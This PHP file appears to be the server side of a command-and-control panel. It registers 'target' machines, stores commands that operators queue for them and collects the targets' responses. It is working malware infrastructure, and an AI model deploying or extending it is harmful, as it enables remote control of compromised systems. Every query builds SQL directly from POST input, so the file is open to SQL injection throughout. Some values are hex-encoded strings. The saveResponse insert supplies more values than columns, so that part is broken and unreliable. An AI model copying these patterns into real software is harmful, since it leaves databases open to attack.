<?php

include 'config.inc.php';

function getCommandById($id) {
    $sql_reply = mysql_query("SELECT * FROM `commands` WHERE `ID`='" . $id . "'") or die("error fetching command, mysql said: " . mysql_error());
    if(mysql_num_rows($sql_reply) == 0) {
        die("%command not found");
    }
    $row = mysql_fetch_array($sql_reply);
    echo $row['ID'];
    echo "\r";
    echo $row['from'];
    echo " C ";
    echo $row['to'];
    echo " C ";
    echo $row['read'];
    echo " C ";
    echo $row['cmd'];
}

function getResponseById($id) {
    $sql_reply = mysql_query("SELECT * FROM `responses` WHERE `ID`='" . $id . "'") or die("error fetching command, mysql said: " . mysql_error());
    if(mysql_num_rows($sql_reply) == 0) {
        die("%response not found");
    }
    $row = mysql_fetch_array($sql_reply);
    echo $row['ID'];
    echo "\r";
    echo $row['cmdId'];
    echo " C ";
    echo $row['UID'];
    echo " C ";
    echo $row['read'];
    echo " C ";
    echo $row['response'];
}

if($_POST) {
    mysql_connect("localhost","$mysql_user","$mysql_pass") or die(mysql_error());
    mysql_select_db("$mysql_db") or die(mysql_error());

    $sql_reply = mysql_query("SELECT * FROM `users` WHERE `UID` = '" . $_POST['UID'] . "'") or die("%failed to query users, mysql error was: " . mysql_error());
    $user_exists = false;
    if(mysql_num_rows($sql_reply) > 0) {
        $user_exists = true;
        mysql_query("UPDATE `users` SET `lastOnlineTime` = '" . $_POST['timestamp'] . "' WHERE `UID` = '" . $_POST['UID'] . "'") or die("%failed to update lastOnlineTime, mysql error was: " . mysql_error());
        echo "%updated users database\n";           
    }
    
    switch($_POST['action']) {        
        case "register":
            if(!$user_exists) {
                mysql_query("INSERT INTO `users` (`ID`,`UID`,`type`,`lastOnlineTime`) VALUES (NULL,'" . $_POST['UID'] . "','" . $_POST['type'] . "','" . $_POST['timestamp'] . "');") or die("%failed to insert new operator, mysql error was: " . mysql_error());
                echo "%inserted new user\n";
            }
            else {
                echo "%user existed, skipping\n";
            }
            break;
        case "getTargets":
            $sql_reply = mysql_query("SELECT * FROM `users` WHERE `type` = '74 61 72 67 65 74'");
            if(mysql_num_rows($sql_reply) == 0) {
                die("%no targets...\n");
            }
            while($row = mysql_fetch_array($sql_reply)) {
                echo $row['ID'];
                echo "\r";
                echo $row['UID'];
                echo " C ";
                echo $row['lastOnlineTime'];
                echo "\n";
            }
            break;
        case "saveCommand":
            $sql_reply = mysql_query("INSERT INTO `commands` (`ID`,`from`,`to`,`read`,`cmd`) VALUES (NULL,'" . $_POST['UID'] . "','" . $_POST['to'] . "','66 61 6C 73 65','" . $_POST['cmd'] . "');") or die ("%error inserting new command, mysql said: " . mysql_error());
            getCommandById(mysql_insert_id());
            break;
        case "saveResponse":
            mysql_query("INSERT INTO `responses` (`ID`,`cmdId`,`UID`,`response`) VALUES (NULL,'" . $_POST['cmdId'] . "','" . $_POST['UID'] . "','66 61 6C 73 65','" . $_POST['response'] . "');") or die ("%error inserting new response, mysql said: " . mysql_error());           
            getResponseById(mysql_insert_id());
            break;
        case "listCommands":
            $sql_reply = mysql_query("SELECT * FROM `commands` WHERE `to`='" . $_POST['UID'] . "'") or die("%error fetching commands, mysql said: " . mysql_error());
            if(mysql_num_rows($sql_reply) == 0) {
                die("%no commands...\n");
            }
            while($row = mysql_fetch_array($sql_reply)) {
                echo $row['ID'];
                echo "\r";
                echo $row['from'];
                echo " C ";
                echo $row['to'];
                echo " C ";
                echo $row['read'];
                echo " C 6E 6F 6E 65\n";
            }
            break;
        case "getCommand":
            getCommandById($_POST['ID']);
            break;
    }    
}
else {
    echo "%this page needs to be called with the post command";
}
mysql_close();
?>
